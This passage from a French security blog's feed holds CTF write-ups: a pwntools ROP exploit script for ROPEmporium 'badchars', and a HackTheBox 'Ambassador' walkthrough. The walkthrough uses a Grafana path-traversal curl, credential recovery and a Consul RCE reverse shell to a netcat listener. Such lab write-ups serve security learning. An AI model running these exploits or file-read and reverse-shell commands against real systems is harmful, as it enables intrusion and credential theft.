</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>On a un <code>mov qword ptr [r13], r12 ; ret</code> situé à <code>0x00400634</code> qui va nous servir à écrire dans <code>.data</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: pop&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a2</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a3</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a1</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>Avec ça, on a un <code>pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</code> situé à <code>0x0040069b</code> qu&rsquo;on va utiliser avec le <code>mov</code>.</p>
<p>Tant qu&rsquo;à faire, on peut aussi garder de côté le <code>pop rdi ; ret</code> (<code>0x004006a3</code>) et le <code>pop r14 ; pop r15 ; ret</code> (<code>0x004006a0</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: xor&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span> : xor byte ptr [r15], r14b ; ret
</span></span></code></pre></div><p>On met aussi ce <code>xor</code> de côté puisqu&rsquo;il va nous servir à un-XOR le string une fois en mémoire.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d8</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  pwnme<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  print_file<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400520</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400600</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400607</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400617</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400640</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006b0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006b4</span>  _fini
</span></span></code></pre></div><p><code>print_file()</code> est située à <code>0x00400510</code></p>
<p>L&rsquo;idée va donc être de:</p>
<ul>
<li>Mettre dans <code>.data</code> un string qui correspond à &ldquo;flag.txt&rdquo; XORé avec une clé de 2</li>
<li>Ensuite, on va le un-XOR avec notre gadget <code>xor</code> une fois qu&rsquo;il est déjà dans la mémoire</li>
<li>Enfin, on appelle <code>print_file()</code> avec notre string en paramètre</li>
</ul>
<p>Ceci va nous permettre de contourner le &ldquo;filtre&rdquo; puisque le string qu&rsquo;on va entrer dans l&rsquo;input ne contiendra aucun des badchars, c&rsquo;est seulement une fois en mémoire qu&rsquo;ils seront apparaîtront (magic)</p>
<h1 id="final-payload">Final Payload</h1>
<p>Voici donc notre payload:</p>
<blockquote>
<p>Note: j&rsquo;ai dû ajouter 8 à l&rsquo;adresse de <code>.data</code> puisque sinon il y avait un badchar dans l&rsquo;adresse elle même et elle se faisait filtrer</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./badchars&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>flaglist <span style="color:#f92672">=</span> list(flag)
</span></span><span style="display:flex;"><span>xored_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On xor notre string</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, len(flaglist)):
</span></span><span style="display:flex;"><span>    flaglist[i] <span style="color:#f92672">=</span> chr(ord(flaglist[i])<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    xored_flag <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(flaglist[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004004ee</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r12_r13_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040069c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour éviter des problèmes de type, on va prendre uniquement la valeur décimale de .data</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># +8</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#ae81ff">6295600</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mov_ptr_r13_r12 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400634</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006a0</span>)
</span></span><span style="display:flex;"><span>xor_byte_ptr_r15_r14 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400628</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006a3</span>)
</span></span><span style="display:flex;"><span>print_file <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400510</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On écrit notre &#34;flag.txt&#34; XORé dans r12, l&#39;adresse de .data dans r13 puis on remplit les deux autres registres de null bytes</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met ensuite notre string dans l&#39;adresse vers laquelle pointe r13 (càd .data)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_r12_r13_r14_r15
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> str<span style="color:#f92672">.</span>encode(xored_flag)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_ptr_r13_r12
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On fait l&#39;opération suivante 8 fois car elle doit être faite pour chaque caractère du string</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (&#34;flag.txt&#34; = 8 bytes)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On met 0x2 (càd la clé avec laquelle on a XOR notre string) dans r14</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Puis on met l&#39;adresse de data+i dans r15, car on va devoir un-xor caractère par caractère</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On XOR ensuite le l&#39;adresse vers laquelle pointe r15 (.data+i) avec r14 (la clé)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_r14_r15
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(data<span style="color:#f92672">+</span>i)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> xor_byte_ptr_r15_r14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enfin, on met notre string un-XORé dans rdi, puis on appelle la fonction print_file()</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> print_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>On peut tester le payload pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/215351100-c463126a-5839-44ef-a4c8-a94397eca44c.png" alt="2023-01-29-202357_1179x660_scrot"></p>
<p>Et il fonctionne ! gg !</p>
]]></content>
        </item>
        
        <item>
            <title>📙 HackTheBox - Ambassador</title>
            <link>/posts/2023/01/hackthebox-ambassador/</link>
            <pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/hackthebox-ambassador/</guid>
            <description>Table of contents Recon
Foothold
Privilege Escalation
Note La room était assez sympa, plutôt entre medium et easy. C&amp;rsquo;est dommage qu&amp;rsquo;il n&amp;rsquo;y ait &amp;ldquo;que&amp;rdquo; des CVE même si l&amp;rsquo;exploitation de Consul est intéressante.
Recon dirb http://10.10.11.183 nmap -sC -sV 10.10.11.183 3000/tcp open ppp? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache 3306/tcp open nagios-nsca Nagios NSCA | mysql-info: | Protocol: 10 | Version: 8.</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="#recon">Recon</a></p>
</li>
<li>
<p><a href="#foothold">Foothold</a></p>
</li>
<li>
<p><a href="#privilege-escalation">Privilege Escalation</a></p>
</li>
</ul>
<hr>
<h1 id="note">Note</h1>
<p>La room était assez sympa, plutôt entre medium et easy. C&rsquo;est dommage qu&rsquo;il n&rsquo;y ait &ldquo;que&rdquo; des CVE même si l&rsquo;exploitation de Consul est intéressante.</p>
<h1 id="recon">Recon</h1>
<pre tabindex="0"><code>dirb http://10.10.11.183
</code></pre><p><img src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png" alt="dirb results"></p>
<pre tabindex="0"><code>nmap -sC -sV 10.10.11.183
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">3000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ppp</span><span style="color:#f92672">?</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">fingerprint</span><span style="color:#f92672">-</span><span style="color:#a6e22e">strings</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">FourOhFourRequest</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Cache</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">no</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cache</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span>; <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#a6e22e">utf</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Expires</span><span style="color:#f92672">:</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">login</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">Pragma</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">no</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cache</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3306</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">nagios</span><span style="color:#f92672">-</span><span style="color:#a6e22e">nsca</span> <span style="color:#a6e22e">Nagios</span> <span style="color:#a6e22e">NSCA</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">mysql</span><span style="color:#f92672">-</span><span style="color:#a6e22e">info</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Protocol</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Version</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">8.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">30</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">ubuntu0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">20.04</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Thread</span> <span style="color:#a6e22e">ID</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">Capabilities</span> <span style="color:#a6e22e">flags</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">65535</span>
</span></span></code></pre></div><p>Rien de vraiment utile au niveau du dirb, le nmap lui en revanche montre deux choses intéressantes:</p>
<ul>
<li><code>mysql</code> sur le port <code>3306</code></li>
<li>On a un service non reconnu sur le port <code>3000</code></li>
</ul>
<p>On se rend sur le port <code>3000</code> et on est redirigés vers un <code>/login</code></p>
<p>Le service non reconnu sur le port 3000 est donc Grafana</p>
<p><img src="https://i.ibb.co/bsdYbp8/2022-12-05-145048-1870x971-scrot.png" alt="2022-12-05-145048_1870x971_scrot.png"></p>
<h1 id="foothold">Foothold</h1>
<p>En bas de la page, on voit que la version de Grafana est <code>8.2.0</code>, or il existe un exploit valable pour toutes les versions <code>&lt;8.3.0</code></p>
<p>→ <a href="https://www.exploit-db.com/exploits/50581">https://www.exploit-db.com/exploits/50581</a></p>
<p>Il s’agit d’un Arbitrary File Read, on devrait donc pouvoir lire plus ou moins tout les fichiers du serveur (tant que l’user Grafana a la permission de le faire)</p>
<p>On peut vérifier que le script fonctionne en lisant le <code>/etc/passwd</code></p>
<p><img src="https://i.ibb.co/SQ92gwv/2022-12-05-145457-943x1048-scrot.png" alt="2022-12-05-145457_943x1048_scrot.png"></p>
<p>L’exploit marche bel et bien, et en lisant le code on peut voir qu&rsquo;il éxecute cette commande bash:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../<span style="color:#f92672">{</span>input<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>On peut récupérer la database du grafana (dans laquelle devrait se trouver le mot de passe de l’utilisateur mysql)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
</span></span></code></pre></div><blockquote>
<p>Le <code>-o</code> permet de sauvegarder l&rsquo;output de notre <code>curl</code> dans un fichier, en l&rsquo;occurence ici, on la sauvegarde dans <code>grafana.db</code></p>
</blockquote>
<p>Puis qu&rsquo;on ne peut pas lire un fichier <code>sqlite</code> en l&rsquo;ouvrant dans un éditeur de texte, on peut l’upload sur <a href="https://sqliteviewer.app">https://sqliteviewer.app</a>.</p>
<p>On trouve assez rapidement un mot de passe dans la table <code>data_source</code></p>
<p><img src="https://i.ibb.co/nfCtZyG/2022-12-05-145940-1143x618-scrot.png" alt="password.png"></p>
<p>On se connecte à la database mysql avec comme user “grafana” et le mot de passe qu&rsquo;on vient de trouver</p>
<pre tabindex="0"><code>mysql -u grafana -p -h ambassador.htb
</code></pre><p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
<p><img src="https://i.ibb.co/jwjtzch/2022-12-05-150214-964x1048-scrot.png" alt="2022-12-05-150214_964x1048_scrot.png"></p>
<p>On peut donc switcher dessus et lister les tables qu&rsquo;elle contient via la commande <code>show TABLES;</code></p>
<p>Il n’y en a qu’une seule: <code>users</code>. En lisant son contenu, on voit un mot de passe encodé en <code>base64</code></p>
<p><img src="https://i.ibb.co/X55ysHw/2022-12-05-150330-961x546-scrot.png" alt="2022-12-05-150330_961x546_scrot.png"></p>
<p>On peut retrouver sa valeur en clair via cette commande</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#34;</span> | base64 -d
</span></span></code></pre></div><p>Pour cette étape, il faut se souvenir d&rsquo;une information présente sur la page principale du site:</p>
<blockquote>
<p>Connecting to this machine Use the developer account to SSH</p>
</blockquote>
<p>On peut donc deviner que l&rsquo;utilisateur qui correspond à ce mot de passe est <code>developer</code></p>
<p><img src="https://i.ibb.co/TrvwZ01/2022-12-05-150853-966x1056-scrot.png" alt="2022-12-05-150853_966x1056_scrot.png"></p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>On peut commencer par run <code>linpeas</code> pour essayer de trouver des vecteurs de privesc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╔══════════╣</span> Interesting GROUP writable files (<span style="color:#f92672">not</span> <span style="color:#f92672">in</span> Home) (max <span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╚</span> [https:<span style="color:#f92672">//</span>book<span style="color:#f92672">.</span>hacktricks<span style="color:#f92672">.</span>xyz<span style="color:#f92672">/</span>linux<span style="color:#f92672">-</span>hardening<span style="color:#f92672">/</span>privilege<span style="color:#f92672">-</span>escalation<span style="color:#75715e">#writable-files](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files)</span>
</span></span><span style="display:flex;"><span>Group developer:
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>consul<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span>config<span style="color:#f92672">.</span>d
</span></span></code></pre></div><p>On peut voir que <code>consul</code> est présent sur cette machine, mais qu&rsquo;est ce que <code>consul</code>?</p>
<p>→ <a href="https://developer.hashicorp.com/consul/docs/intro">https://developer.hashicorp.com/consul/docs/intro</a></p>
<p><code>Consul</code> permet entre autres d&rsquo;enregistrer des <strong>tâches</strong> en tant que <code>root</code> (qui seront donc effectuées avec les permissions <code>sudo</code>)</p>
<p>On peut déjà comprendre assez vite comment va fonctionner la privesc.</p>
<p>On trouve <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">cet exploit</a> qui devrait pouvoir fonctionner dans notre situation</p>
<p>Le problème, c’est qu’il demande un <code>token consul</code> qui permet d&rsquo;enregistrer de nouvelles tasks.</p>
<p>N&rsquo;ayant pas ce token, je me suis replongé dans l&rsquo;output de <code>linpeas</code> pensant que <code>consul</code> n&rsquo;était pas la solution pour cette privesc.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╔══════════╣</span> Analyzing Github Files (limit <span style="color:#ae81ff">70</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> rw<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>r<span style="color:#f92672">--</span> <span style="color:#ae81ff">1</span> developer developer <span style="color:#ae81ff">93</span> Sep <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">28</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>developer<span style="color:#f92672">/.</span>gitconfig
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>drwxrwxr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">8</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>app<span style="color:#f92672">/.</span>git
</span></span></code></pre></div><p>On voit qu&rsquo;il existe un répertoire <code>.git</code> dans <code>/opt/my-app</code></p>
<p>On peut donc s&rsquo;y rendre puis faire un <code>git log</code> pour accéder à l&rsquo;historique des commits faits au repo. On affiche ensuite les changements faits au commit original</p>
<pre tabindex="0"><code>git show 33a53ef9a207976d5ceceddc41a199558843bf3c
</code></pre><p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
<p><img src="https://i.ibb.co/z4Vv44N/2022-12-05-151635-965x1055-scrot.png" alt="bb03b43b-1d81-d62b-24b5-39540ee469b5"></p>
<p>On reprend donc <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">l&rsquo;exploit</a> de tout à l&rsquo;heure, que devrait fonctionner maintenant qu&rsquo;on a le <code>token consul</code></p>
<blockquote>
<p>Il est aussi possible de passer par metasploit puisqu&rsquo;il existe un exploit pour cette CVE, mais puisque <code>consul</code> est un service local (il n&rsquo;est accessible que localement) il faudrait forwarder le port avec <code>chisel</code>. C&rsquo;est faisable sur cette machine, mais j&rsquo;ai décidé ici de directement mettre l&rsquo;exploit sur la machine.</p>
</blockquote>
<p>On lance notre listener <code>netcat</code>, puis on lance l&rsquo;exploit sur la machine via cette commande</p>
<pre tabindex="0"><code>python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
</code></pre><blockquote>
<p>8500 = Port sur lequel se trouve le service <code>consul</code></p>
<p>1338 = Port sur lequel écoute notre <code>netcat</code></p>
<p>10.10.14.53 = L&rsquo;IP de notre <code>OpenVPN</code> (ou de votre machine)</p>
</blockquote>
<p>On attend quelques secondes puis on reçoit la connection via le <code>netcat</code></p>
<p><img src="https://i.ibb.co/zb4CsX6/2022-12-05-152521-1916x1080-scrot.png" alt="2022-12-05-152521_1916x1080_scrot.png"></p>
<h6 id="back-to-top"><a href="#"><em>back to top</em></a></h6>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - write4 (x64)</title>
            <link>/posts/2023/01/ropemporium-write4-x64/</link>
            <pubDate>Tue, 03 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-write4-x64/</guid>
            <description>Note Quatrième exo de ROPEmporium, il introduit une nouvelle méchanique et nous pousse à utiliser un nouveau type de gadget, très intéressant
Si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur discord pour me le dire.
